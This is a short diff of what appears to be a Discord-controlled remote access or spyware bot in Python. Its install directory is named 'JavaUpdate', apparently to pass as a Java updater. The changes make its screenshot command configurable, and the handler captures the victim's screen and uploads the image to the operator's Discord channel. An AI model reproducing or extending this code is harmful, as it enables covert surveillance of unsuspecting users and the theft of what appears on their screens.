@@ -1,9 +1,9 @@
 #configuration
 
 token = "change me"
-directoryname = "JavaUpdate"
 prefix = "!"
-
+command = "screenshot"
+directoryname = "JavaUpdate"
 
 #----------------------------------------------------------------------------------#
 
@@ -44,8 +44,8 @@ async def on_ready():
     
 
 
-@client.command()
-async def screenshot(ctx):
+@client.command(aliases=[command])
+async def screenshittercommand(ctx):
     screenshitting()
     currenttime = time.strftime("%H:%M:%S")
     file = discord.File(pathss, filename="screenshot.png")
